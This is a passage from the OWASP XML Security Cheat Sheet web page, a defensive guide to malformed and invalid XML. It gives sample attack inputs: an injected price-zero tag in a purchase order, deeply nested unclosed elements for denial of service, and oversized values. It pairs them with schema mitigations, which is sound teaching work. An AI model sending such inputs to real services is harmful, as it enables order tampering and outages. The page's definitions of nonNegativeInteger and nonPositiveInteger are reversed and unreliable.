<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">







<meta name="description" content="XML Security Cheat Sheet on the main website for The OWASP Foundation. OWASP is a nonprofit foundation that works to improve the security of software.">
<meta property="og:description" content="XML Security Cheat Sheet on the main website for The OWASP Foundation. OWASP is a nonprofit foundation that works to improve the security of software.">
<meta propery="og:title" content="cheat sheets | XML Security Cheat Sheet | OWASP Foundation">
<meta property="og:url" content="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/XML_Security_Cheat_Sheet.html">
<meta property="og:locale" content="en_US">

<!-- should probably look at using article at some point for www-community at least -->
<meta property="og:type" content="website" />
<meta property="og:image" content="https://owasp.org/www--site-theme/favicon.ico" />
<meta http-equiv="X-Content-Type-Options" content="nosniff">
<meta http-equiv="X-XSS-Protection" content="1; mode=block">


<link rel="canonical" href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/XML_Security_Cheat_Sheet" />
<!-- Global site tag (gtag.js) - Google Analytics -->
<!-- <script async src="https://www.googletagmanager.com/gtag/js?id=UA-4531126-1"></script> -->
<!-- <script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-4531126-1');
</script> -->
<!-- Google Analytics -->


<script src="https://owasp.org/www--site-theme/assets/js/js.cookie.js"></script>
<script>
  if(Cookies.get('cookies-ok') == 'true' && window.ga === undefined)
  {
    window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
    ga('create', 'UA-4531126-1', 'auto');
    ga('send', 'pageview');
  }
  else if (Cookies.get('cookies-ok') == 'true')
  {
    ga('send', 'pageview');
  }

  function handleOutboundLinkClicks(event) {
    var href = '';
    if(event.target.href == undefined)
      href = event.target.parentElement.href;
    else
      href = event.target.href
  if(Cookies.get('cookies-ok') == 'true'){  
    
    ga('send', 'event', {
      eventCategory: 'Outbound Link',
      eventAction: 'click',
      eventLabel: href,
      transport: 'beacon'
    });
  }
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>
<!-- End Google Analytics -->
<link rel="stylesheet" href="https://owasp.org/www--site-theme/assets/css/styles.css">
<link rel="shortcut icon" type="images/x-icon" href="https://owasp.org/www--site-theme/favicon.ico">

<script src="https://owasp.org/www--site-theme/assets/js/jquery-3.4.1.min.js"></script>
<script src="https://owasp.org/www--site-theme/assets/js/util.js"></script>
<script src="https://owasp.org/www--site-theme/assets/js/yaml.min.js"></script>
<script src="https://owasp.org/www--site-theme/assets/js/luxon.min.js"></script>
<title>XML Security Cheat Sheet | OWASP</title>

    <script type="text/javascript">
      $(function(){
        var baseurl = "https://github.com/OWASP/www-chapter-ankara/blob/master/";
        var path = "cheatsheets/XML_Security_Cheat_Sheet.md";
        $('.repo').html('<a href=' + baseurl + path + '><div class="reset-3c756112--menuItemIcon-206eb252" style="float: left;"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="currentColor" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 438.549 438.549" stroke="none" class="icon-7f6730be--text-3f89f380"><g><path d="M409.132 114.573c-19.608-33.596-46.205-60.194-79.798-79.8-33.598-19.607-70.277-29.408-110.063-29.408-39.781 0-76.472 9.804-110.063 29.408-33.596 19.605-60.192 46.204-79.8 79.8C9.803 148.168 0 184.854 0 224.63c0 47.78 13.94 90.745 41.827 128.906 27.884 38.164 63.906 64.572 108.063 79.227 5.14.954 8.945.283 11.419-1.996 2.475-2.282 3.711-5.14 3.711-8.562 0-.571-.049-5.708-.144-15.417a2549.81 2549.81 0 0 1-.144-25.406l-6.567 1.136c-4.187.767-9.469 1.092-15.846 1-6.374-.089-12.991-.757-19.842-1.999-6.854-1.231-13.229-4.086-19.13-8.559-5.898-4.473-10.085-10.328-12.56-17.556l-2.855-6.57c-1.903-4.374-4.899-9.233-8.992-14.559-4.093-5.331-8.232-8.945-12.419-10.848l-1.999-1.431c-1.332-.951-2.568-2.098-3.711-3.429-1.142-1.331-1.997-2.663-2.568-3.997-.572-1.335-.098-2.43 1.427-3.289 1.525-.859 4.281-1.276 8.28-1.276l5.708.853c3.807.763 8.516 3.042 14.133 6.851 5.614 3.806 10.229 8.754 13.846 14.842 4.38 7.806 9.657 13.754 15.846 17.847 6.184 4.093 12.419 6.136 18.699 6.136 6.28 0 11.704-.476 16.274-1.423 4.565-.952 8.848-2.383 12.847-4.285 1.713-12.758 6.377-22.559 13.988-29.41-10.848-1.14-20.601-2.857-29.264-5.14-8.658-2.286-17.605-5.996-26.835-11.14-9.235-5.137-16.896-11.516-22.985-19.126-6.09-7.614-11.088-17.61-14.987-29.979-3.901-12.374-5.852-26.648-5.852-42.826 0-23.035 7.52-42.637 22.557-58.817-7.044-17.318-6.379-36.732 1.997-58.24 5.52-1.715 13.706-.428 24.554 3.853 10.85 4.283 18.794 7.952 23.84 10.994 5.046 3.041 9.089 5.618 12.135 7.708 17.705-4.947 35.976-7.421 54.818-7.421s37.117 2.474 54.823 7.421l10.849-6.849c7.419-4.57 16.18-8.758 26.262-12.565 10.088-3.805 17.802-4.853 23.134-3.138 8.562 21.509 9.325 40.922 2.279 58.24 15.036 16.18 22.559 35.787 22.559 58.817 0 16.178-1.958 30.497-5.853 42.966-3.9 12.471-8.941 22.457-15.125 29.979-6.191 7.521-13.901 13.85-23.131 18.986-9.232 5.14-18.182 8.85-26.84 11.136-8.662 2.286-18.415 4.004-29.263 5.146 9.894 8.562 14.842 22.077 14.842 40.539v60.237c0 3.422 1.19 6.279 3.572 8.562 2.379 2.279 6.136 2.95 11.276 1.995 44.163-14.653 80.185-41.062 108.068-79.226 27.88-38.161 41.825-81.126 41.825-128.906-.01-39.771-9.818-76.454-29.414-110.049z"></path></g></svg><span style="padding-left:8px;">Edit on GitHub</span></div></a>');
      });
    </script>
    <script async defer src="https://buttons.github.io/buttons.js"></script>
  </head>
  <body class="base-grid col-sidebar">

    <div id="blocker"></div>

    <noscript>For full functionality of this site it is necessary to enable JavaScript. Here are the <a href="https://www.enable-javascript.com/"> instructions how to enable JavaScript in your web browser</a>.</noscript>
    <header role="banner">
  <div id="banner" class="notice" aria-label="announcement">
  <!--
	<p>Consider <a href="/membership">becoming a Member</a> of the OWASP Foundation. It's affordable and your contributions make a difference.</p>
  -->
 
	<p>Please support the OWASP mission to improve sofware security through open source initiatives and community education. <a href="https://owasp.org/donate/">Donate Now!</a></p>
	
	<a href="#" id="close-banner" aria-label="close announcement">
          <i class="fa fa-times"></i>
       </a>	  
</div>

<style>
  #banner img {
    max-width: 30em;
  }

  @media (max-width: 1131px) {
    #banner img{
      max-width: 30em;
    }
	}

@media (max-width: 800px) {
	#banner img{
      max-width: 20em;
    }
}

@media (max-width: 600px) {
	#banner img{
      max-width: 20em;
    }
}

@media (max-width: 450px) {
	#banner img{
      max-width: 250px;
  }
}
</style>

  <div class="header-wrapper" aria-label="main navigation">
    <nav class="alt-nav">
      <a href="#" class="menu-toggler" aria-hidden="true">
        <i class="fa fa-bars"></i>
      </a>
      <a href="/" class="alt-logo" aria-label="go to homepage">
          <img src="/assets/images/logo.png" alt="OWASP logo">
      </a>
      <div id="overlay" class="remove-el">

      </div>
      <!-- jekyll menu stuff -->
    </nav>
    
    <nav class="top-nav" role="navigation" aria-label="primary navigation">
      <a href="/" class="desktop-logo" aria-label="go to homepage">
        <img src="/assets/images/logo.png" alt="">
      </a>
      <!-- jekyll menu stuff -->
      
      <div class="interactive-wrapper">
        <form role="search" method="get" action="/search">   
          <div class='search-div'>
            <input id="searchString" name="searchString" class="search-bar" type="search" placeholder="Search OWASP.org" required="true">
            <button id="search-button" type="submit" class="fa fa-search">
                <!--<span id="search-icon" tabindex="0"><i class="fa fa-search"></i></span>-->
            </button>
          </div>  
        </form>
        <div class="nav-button" aria-label="donate to or join OWASP">
        
          <a href="/donate?reponame=www-chapter-ankara&title=XML+Security+Cheat+Sheet" class="cta-button green">Donate</a>
          <a href="/membership" class="cta-button">Join</a>
        </div>
      </div>
    </nav>
    <div id='disclaimer-container'>
<div id="disclaimer">
    <p>This website uses cookies to analyze our traffic and only share that information with our analytics partners.</p><a class="disclaimerOK">Accept</a>
</div>
<div id="close-disclaimer">x</div>
</div>
  </div>
  



<script type="text/javascript">
  $(function(){
      
      url = $(location).attr('href');
      if(url.includes('www2'))
      {
        url = url.replace(/www2./, '');
        $(location).attr('href',url);
        return;
      }
    // this works to get data from a json file NOT in data
      $.getJSON("https://owasp.org/www--site-theme/assets/sitedata/menus.json", function(data) {
         var listr = "<ul aria-label='header menu'>";
         
         var mlistr = "<ul class='mobile-menu hide-el' role='navigation' aria-label='mobile primary navigation'>";

          mlistr += "<li><a href='#' class='menu-toggler' aria-hidden='true'><i class='fa fa-times'></i></a></li>";
          mlistr += "<li>";
          mlistr += "<form role='search' method='get' action='/search'>";   
          mlistr += "<div class='search-div'>";
          mlistr += "<input id='searchString' aria-label='search input' name='searchString' class='search-bar' type='search' placeholder='Search OWASP.org' required='true'>";
          mlistr += "<button id='search-button' aria-label='search button' type='submit' class='fa fa-search' style='padding-left: 8px;'></button></div></form>";
          mlistr += "</li>";
          $.each(data.menus, function (ndx, menu){
              listr += "<li><a href='" + menu.url + "'>" + menu.title + "</a>";

              if(!menu.items)
              {
                  mlistr += "<li><a href='" + menu.url + "'>" + menu.title + "</a>";
              }
              
              if(menu.items){
                  listr += "<ul class='dropdown-menu'>";
                  mlistr += "<button class='accordion'>" + menu.title + "</button>";
                  mlistr += "<div class='panel'>";
                  mlistr += "<ul>";
                $.each(menu.items, function(ndx, item){
                
                  if(item.separator)
                  {
                      listr += "<li class='separator'>";
                      mlistr += "<li class='separator'>";
                  }
                  else
                  {
                      listr += "<li>";
                      mlistr += "<li>";
                  }
                  listr += "<a href='" + item.url + "'";
                  mlistr += "<a href='" + item.url + "'";
                  if(item.opentab)
                  {
                    listr += " target='_blank' rel='noopener noreferrer'";
                    mlistr += " target='_blank' rel='noopener noreferrer'";
                  }

                  listr += ">" + item.title + "</a></li>";
                  mlistr += ">" + item.title + "</a></li>";
                });
                listr += "</ul>";
                mlistr += "</ul>";
                mlistr += "</div>"
              }
              
              listr += "</li>";
              mlistr += "</li>";
          });
          listr += "</ul>";
          mlistr += "<li><a href='/donate'>MAKE A DONATION</a></li>";
          mlistr += "<li><a href='/membership'>BECOME A MEMBER</a></li>";
          mlistr += "<li><a href='/sitemap'>SITEMAP</a></li>";
          mlistr += "</ul>";
          
          $('.desktop-logo').after(listr);
          $('#overlay').after(mlistr);

          $(".accordion").click(function () {
              $(this).toggleClass("active");
              if($(this).next('.panel').css('display') == 'block'){
                $(this).next('.panel').css('display', 'none');
              }
              else {
                $(this).next('.panel').css('display', 'block');
              }
            });
            $(".menu-toggler").click(function() {
              $(".mobile-menu").toggleClass('hide-el');
            });
      });
    });
  </script>
</header>


    <main role="main">
      <div class="main-wrapper document">
        
  
  
  
  
  
  
  




                




    
    
    
    

    
    
        
        
        <div id="main" class="page-body tab" role="tabpanel" aria-labelledby="main-link" tabindex="0">
          <div class="doc-title">cheat sheets</div>
          <h1 class="page-title">XML Security Cheat Sheet</h1>
          
          <nav role="navigation" aria-label="navigate page">
              <ol>
              
              
                
                <li class='page next'><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Abuse_Case_Cheat_Sheet">Abuse Case Cheat Sheet<span style="font-size: 3em; color: lightgray; vertical-align:middle;">
                    <i class="fas fa-angle-right"></i>
                  </span></a></li>
              
              </ol>
          </nav>
          
          <section id='div-main' class='page-body tab'>
          <h1 id="introduction">Introduction</h1>

<p>Specifications for XML and XML schemas include multiple security flaws. At the same time, these specifications provide the tools required to protect XML applications. Even though we use XML schemas to define the security of XML documents, they can be used to perform a variety of attacks: file retrieval, server side request forgery, port scanning, or brute forcing. This cheat sheet exposes how to exploit the different possibilities in libraries and software divided in two sections:</p>

<ul>
  <li><strong>Malformed XML Documents</strong>: vulnerabilities using not well formed documents.</li>
  <li><strong>Invalid XML Documents</strong>: vulnerabilities using documents that do not have the expected structure.</li>
</ul>

<h1 id="malformed-xml-documents">Malformed XML Documents</h1>

<p>The W3C XML specification defines a set of principles that XML documents must follow to be considered well formed. When a document violates any of these principles, it must be considered a fatal error and the data it contains is considered malformed. Multiple tactics will cause a malformed document: removing an ending tag, rearranging the order of elements into a nonsensical structure, introducing forbidden characters, and so on. The XML parser should stop execution once detecting a fatal error. The document should not undergo any additional processing, and the application should display an error message.</p>

<p>The recommendation to avoid these vulnerabilities are to use an XML processor that follows W3C specifications and does not take significant additional time to process malformed documents. In addition, use only well-formed documents and validate the contents of each element and attribute to process only valid values within predefined boundaries.</p>

<h2 id="more-time-required">More Time Required</h2>

<p>A malformed document may affect the consumption of Central Processing Unit (CPU) resources. In certain scenarios, the amount of time required to process malformed documents may be greater than that required for well-formed documents. When this happens, an attacker may exploit an asymmetric resource consumption attack to take advantage of the greater processing time to cause a Denial of Service (DoS).</p>

<p>To analyze the likelihood of this attack, analyze the time taken by a regular XML document vs the time taken by a malformed version of that same document. Then, consider how an attacker could use this vulnerability in conjunction with an XML flood attack using multiple documents to amplify the effect.</p>

<h2 id="applications-processing-malformed-data">Applications Processing Malformed Data</h2>

<p>Certain XML parsers have the ability to recover malformed documents. They can be instructed to try their best to return a valid tree with all the content that they can manage to parse, regardless of the document’s noncompliance with the specifications. Since there are no predefined rules for the recovery process, the approach and results may not always be the same. Using malformed documents might lead to unexpected issues related to data integrity.</p>

<p>The following two scenarios illustrate attack vectors a parser will analyze in recovery mode:</p>

<h3 id="malformed-document-to-malformed-document">Malformed Document to Malformed Document</h3>

<p>According to the XML specification, the string <code class="language-plaintext highlighter-rouge">--</code> (double-hyphen) must not occur within comments. Using the recovery mode of lxml and PHP, the following document will remain the same after being recovered:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;element&gt;</span>
 <span class="c">&lt;!-- one
  &lt;!-- another comment
 comment --&gt;</span>
<span class="nt">&lt;/element&gt;</span>
</code></pre></div></div>

<h3 id="well-formed-document-to-well-formed-document-normalized">Well-Formed Document to Well-Formed Document Normalized</h3>

<p>Certain parsers may consider normalizing the contents of your <code class="language-plaintext highlighter-rouge">CDATA</code> sections. This means that they will update the special characters contained in the <code class="language-plaintext highlighter-rouge">CDATA</code> section to contain the safe versions of these characters even though is not required:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;element&gt;</span>
 <span class="cp">&lt;![CDATA[&lt;script&gt;a=1;&lt;/script&gt;]]&gt;</span>
<span class="nt">&lt;/element&gt;</span>
</code></pre></div></div>

<p>Normalization of a <code class="language-plaintext highlighter-rouge">CDATA</code> section is not a common rule among parsers. Libxml could transform this document to its canonical version, but although well formed, its contents may be considered malformed depending on the situation:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;element&gt;</span>
 <span class="ni">&amp;lt;</span>script<span class="ni">&amp;gt;</span>a=1;<span class="ni">&amp;lt;</span>/script<span class="ni">&amp;gt;</span>
<span class="nt">&lt;/element&gt;</span>
</code></pre></div></div>

<h2 id="coercive-parsing">Coercive Parsing</h2>

<p>A coercive attack in XML involves parsing deeply nested XML documents without their corresponding ending tags. The idea is to make the victim use up -and eventually deplete- the machine’s resources and cause a denial of service on the target. Reports of a DoS attack in Firefox 3.67 included the use of 30,000 open XML elements without their corresponding ending tags. Removing the closing tags simplified the attack since it requires only half of the size of a well-formed document to accomplish the same results. The number of tags being processed eventually caused a stack overflow. A simplified version of such a document would look like this:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;A1&gt;</span>
 <span class="nt">&lt;A2&gt;</span> 
  <span class="nt">&lt;A3&gt;</span>
   ...
    <span class="nt">&lt;A30000&gt;</span>
</code></pre></div></div>

<h2 id="violation-of-xml-specification-rules">Violation of XML Specification Rules</h2>

<p>Unexpected consequences may result from manipulating documents using parsers that do not follow W3C specifications. It may be possible to achieve crashes and/or code execution when the software does not properly verify how to handle incorrect XML structures. Feeding the software with fuzzed XML documents may expose this behavior.</p>

<h1 id="invalid-xml-documents">Invalid XML Documents</h1>

<p>Attackers may introduce unexpected values in documents to take advantage of an application that does not verify whether the document contains a valid set of values. Schemas specify restrictions that help identify whether documents are valid. A valid document is well formed and complies with the restrictions of a schema, and more than one schema can be used to validate a document. These restrictions may appear in multiple files, either using a single schema language or relying on the strengths of the different schema languages.</p>

<p>The recommendation to avoid these vulnerabilities is that each XML document must have a precisely defined XML Schema (not <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>) with every piece of information properly restricted to avoid problems of improper data validation. Use a local copy or a known good repository instead of the schema reference supplied in the XML document. Also, perform an integrity check of the XML schema file being referenced, bearing in mind the possibility that the repository could be compromised. In cases where the XML documents are using remote schemas, configure servers to use only secure, encrypted communications to prevent attackers from eavesdropping on network traffic.</p>

<h2 id="document-without-schema">Document without Schema</h2>

<p>Consider a bookseller that uses a web service through a web interface to make transactions. The XML document for transactions is composed of two elements: an <code class="language-plaintext highlighter-rouge">id</code> value related to an item and a certain <code class="language-plaintext highlighter-rouge">price</code>. The user may only introduce a certain <code class="language-plaintext highlighter-rouge">id</code> value using the web interface:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;buy&gt;</span>
 <span class="nt">&lt;id&gt;</span>123<span class="nt">&lt;/id&gt;</span>
 <span class="nt">&lt;price&gt;</span>10<span class="nt">&lt;/price&gt;</span>
<span class="nt">&lt;/buy&gt;</span>
</code></pre></div></div>

<p>If there is no control on the document’s structure, the application could also process different well-formed messages with unintended consequences. The previous document could have contained additional tags to affect the behavior of the underlying application processing its contents:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;buy&gt;</span>
 <span class="nt">&lt;id&gt;</span>123<span class="nt">&lt;/id&gt;&lt;price&gt;</span>0<span class="nt">&lt;/price&gt;&lt;id&gt;&lt;/id&gt;</span>
 <span class="nt">&lt;price&gt;</span>10<span class="nt">&lt;/price&gt;</span>
<span class="nt">&lt;/buy&gt;</span>
</code></pre></div></div>

<p>Notice again how the value 123 is supplied as an <code class="language-plaintext highlighter-rouge">id</code>, but now the document includes additional opening and closing tags. The attacker closed the <code class="language-plaintext highlighter-rouge">id</code> element and sets a bogus <code class="language-plaintext highlighter-rouge">price</code> element to the value 0. The final step to keep the structure well-formed is to add one empty <code class="language-plaintext highlighter-rouge">id</code> element. After this, the application adds the closing tag for <code class="language-plaintext highlighter-rouge">id</code> and set the <code class="language-plaintext highlighter-rouge">price</code> to 10. If the application processes only the first values provided for the id and the value without performing any type of control on the structure, it could benefit the attacker by providing the ability to buy a book without actually paying for it.</p>

<h2 id="unrestrictive-schema">Unrestrictive Schema</h2>

<p>Certain schemas do not offer enough restrictions for the type of data that each element can receive. This is what normally happens when using <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>; it has a very limited set of possibilities compared to the type of restrictions that can be applied in XML documents. This could expose the application to undesired values within elements or attributes that would be easy to constrain when using other schema languages. In the following example, a person’s <code class="language-plaintext highlighter-rouge">age</code> is validated against an inline <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> schema:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE person [
 &lt;!ELEMENT person (name, age)&gt;</span>
 <span class="cp">&lt;!ELEMENT name (#PCDATA)&gt;</span>
 <span class="cp">&lt;!ELEMENT age (#PCDATA)&gt;</span>
]&gt;
<span class="nt">&lt;person&gt;</span>
 <span class="nt">&lt;name&gt;</span>John Doe<span class="nt">&lt;/name&gt;</span>
 <span class="nt">&lt;age&gt;</span>11111..(1.000.000digits)..11111<span class="nt">&lt;/age&gt;</span>
<span class="nt">&lt;/person&gt;</span>
</code></pre></div></div>

<p>The previous document contains an inline <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> with a root element named <code class="language-plaintext highlighter-rouge">person</code>. This element contains two elements in a specific order: <code class="language-plaintext highlighter-rouge">name</code> and then <code class="language-plaintext highlighter-rouge">age</code>. The element <code class="language-plaintext highlighter-rouge">name</code> is then defined to contain <code class="language-plaintext highlighter-rouge">PCDATA</code> as well as the element <code class="language-plaintext highlighter-rouge">age</code>. After this definition begins the well-formed and valid XML document. The element name contains an irrelevant value but the <code class="language-plaintext highlighter-rouge">age</code> element contains one million digits. Since there are no restrictions on the maximum size for the <code class="language-plaintext highlighter-rouge">age</code> element, this one-million-digit string could be sent to the server for this element. Typically this type of element should be restricted to contain no more than a certain amount of characters and constrained to a certain set of characters (for example, digits from 0 to 9, the + sign and the - sign). If not properly restricted, applications may handle potentially invalid values contained in documents. Since it is not possible to indicate specific restrictions (a maximum length for the element <code class="language-plaintext highlighter-rouge">name</code> or a valid range for the element <code class="language-plaintext highlighter-rouge">age</code>), this type of schema increases the risk of affecting the integrity and availability of resources.</p>

<h2 id="improper-data-validation">Improper Data Validation</h2>

<p>When schemas are insecurely defined and do not provide strict rules, they may expose the application to diverse situations. The result of this could be the disclosure of internal errors or documents that hit the application’s functionality with unexpected values.</p>

<h3 id="string-data-types">String Data Types</h3>

<p>Provided you need to use a hexadecimal value, there is no point in defining this value as a string that will later be restricted to the specific 16 hexadecimal characters. To exemplify this scenario, when using XML encryption some values must be encoded using base64 . This is the schema definition of how these values should look:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;element</span> <span class="na">name=</span><span class="s">"CipherData"</span> <span class="na">type=</span><span class="s">"xenc:CipherDataType"</span><span class="nt">/&gt;</span>
 <span class="nt">&lt;complexType</span> <span class="na">name=</span><span class="s">"CipherDataType"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;choice&gt;</span>
   <span class="nt">&lt;element</span> <span class="na">name=</span><span class="s">"CipherValue"</span> <span class="na">type=</span><span class="s">"base64Binary"</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;element</span> <span class="na">ref=</span><span class="s">"xenc:CipherReference"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/choice&gt;</span>
 <span class="nt">&lt;/complexType&gt;</span>
</code></pre></div></div>

<p>The previous schema defines the element <code class="language-plaintext highlighter-rouge">CipherValue</code> as a base64 data type. As an example, the IBM WebSphere DataPower SOA Appliance allowed any type of characters within this element after a valid base64 value, and will consider it valid. The first portion of this data is properly checked as a base64 value, but the remaining characters could be anything else (including other sub-elements of the <code class="language-plaintext highlighter-rouge">CipherData</code> element). Restrictions are partially set for the element, which means that the information is probably tested using an application instead of the proposed sample schema.</p>

<h3 id="numeric-data-types">Numeric Data Types</h3>

<p>Defining the correct data type for numbers can be more complex since there are more options than there are for strings.</p>

<h4 id="negative-and-positive-restrictions">Negative and Positive Restrictions</h4>

<p>XML Schema numeric data types can include different ranges of numbers. They could include:</p>

<ul>
  <li><strong>negativeInteger</strong>: Only negative numbers</li>
  <li><strong>nonNegativeInteger</strong>: Negative numbers and the zero value</li>
  <li><strong>positiveInteger</strong>: Only positive numbers</li>
  <li><strong>nonPositiveInteger</strong>: Positive numbers and the zero value</li>
</ul>

<p>The following sample document defines an <code class="language-plaintext highlighter-rouge">id</code> for a product, a <code class="language-plaintext highlighter-rouge">price</code>, and a <code class="language-plaintext highlighter-rouge">quantity</code> value that is under the control of an attacker:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;buy&gt;</span>
 <span class="nt">&lt;id&gt;</span>1<span class="nt">&lt;/id&gt;</span>
 <span class="nt">&lt;price&gt;</span>10<span class="nt">&lt;/price&gt;</span>
 <span class="nt">&lt;quantity&gt;</span>1<span class="nt">&lt;/quantity&gt;</span>
<span class="nt">&lt;/buy&gt;</span>
</code></pre></div></div>

<p>To avoid repeating old errors, an XML schema may be defined to prevent processing the incorrect structure in cases where an attacker wants to introduce additional elements:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;xs:schema</span> <span class="na">xmlns:xs=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"buy"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;xs:complexType&gt;</span>
   <span class="nt">&lt;xs:sequence&gt;</span>
    <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"id"</span> <span class="na">type=</span><span class="s">"xs:integer"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"price"</span> <span class="na">type=</span><span class="s">"xs:decimal"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"quantity"</span> <span class="na">type=</span><span class="s">"xs:integer"</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;/xs:sequence&gt;</span>
  <span class="nt">&lt;/xs:complexType&gt;</span>
 <span class="nt">&lt;/xs:element&gt;</span>
<span class="nt">&lt;/xs:schema&gt;</span>
</code></pre></div></div>

<p>Limiting that <code class="language-plaintext highlighter-rouge">quantity</code> to an integer data type will avoid any unexpected characters. Once the application receives the previous message, it may calculate the final price by doing <code class="language-plaintext highlighter-rouge">price*quantity</code>. However, since this data type may allow negative values, it might allow a negative result on the user’s account if an attacker provides a negative number. What you probably want to see in here to avoid that logical vulnerability is positiveInteger instead of integer.</p>

<h4 id="divide-by-zero">Divide by Zero</h4>

<p>Whenever using user controlled values as denominators in a division, developers should avoid allowing the number zero. In cases where the value zero is used for division in XSLT, the error <code class="language-plaintext highlighter-rouge">FOAR0001</code> will occur. Other applications may throw other exceptions and the program may crash. There are specific data types for XML schemas that specifically avoid using the zero value. For example, in cases where negative values and zero are not considered valid, the schema could specify the data type <code class="language-plaintext highlighter-rouge">positiveInteger</code> for the element.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"denominator"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;xs:simpleType&gt;</span>
  <span class="nt">&lt;xs:restriction</span> <span class="na">base=</span><span class="s">"xs:positiveInteger"</span><span class="nt">/&gt;</span>
 <span class="nt">&lt;/xs:simpleType&gt;</span>
<span class="nt">&lt;/xs:element&gt;</span>
</code></pre></div></div>

<p>The element <code class="language-plaintext highlighter-rouge">denominator</code> is now restricted to positive integers. This means that only values greater than zero will be considered valid. If you see any other type of restriction being used, you may trigger an error if the denominator is zero.</p>

<h4 id="special-values-infinity-and-not-a-number-nan">Special Values: Infinity and Not a Number (NaN)</h4>

<p>The data types <code class="language-plaintext highlighter-rouge">float</code> and <code class="language-plaintext highlighter-rouge">double</code> contain real numbers and some special values: <code class="language-plaintext highlighter-rouge">-Infinity</code> or <code class="language-plaintext highlighter-rouge">-INF</code>, <code class="language-plaintext highlighter-rouge">NaN</code>, and <code class="language-plaintext highlighter-rouge">+Infinity</code> or <code class="language-plaintext highlighter-rouge">INF</code>. These possibilities may be useful to express certain values, but they are sometimes misused. The problem is that they are commonly used to express only real numbers such as prices. This is a common error seen in other programming languages, not solely restricted to these technologies. Not considering the whole spectrum of possible values for a data type could make underlying applications fail. If the special values <code class="language-plaintext highlighter-rouge">Infinity</code> and <code class="language-plaintext highlighter-rouge">NaN</code> are not required and only real numbers are expected, the data type <code class="language-plaintext highlighter-rouge">decimal</code> is recommended:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;xs:schema</span> <span class="na">xmlns:xs=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"buy"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;xs:complexType&gt;</span>
   <span class="nt">&lt;xs:sequence&gt;</span>
    <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"id"</span> <span class="na">type=</span><span class="s">"xs:integer"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"price"</span> <span class="na">type=</span><span class="s">"xs:decimal"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"quantity"</span> <span class="na">type=</span><span class="s">"xs:positiveInteger"</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;/xs:sequence&gt;</span>
  <span class="nt">&lt;/xs:complexType&gt;</span>
 <span class="nt">&lt;/xs:element&gt;</span>
<span class="nt">&lt;/xs:schema&gt;</span>
</code></pre></div></div>

<p>The price value will not trigger any errors when set at Infinity or NaN, because these values will not be valid. An attacker can exploit this issue if those values are allowed.</p>

<h3 id="general-data-restrictions">General Data Restrictions</h3>

<p>After selecting the appropriate data type, developers may apply additional restrictions. Sometimes only a certain subset of values within a data type will be considered valid:</p>

<h4 id="prefixed-values">Prefixed Values</h4>

<p>Certain types of values should only be restricted to specific sets: traffic lights will have only three types of colors, only 12 months are available, and so on. It is possible that the schema has these restrictions in place for each element or attribute. This is the most perfect whitelist scenario for an application: only specific values will be accepted. Such a constraint is called <code class="language-plaintext highlighter-rouge">enumeration</code> in XML schema. The following example restricts the contents of the element month to 12 possible values:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"month"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;xs:simpleType&gt;</span>
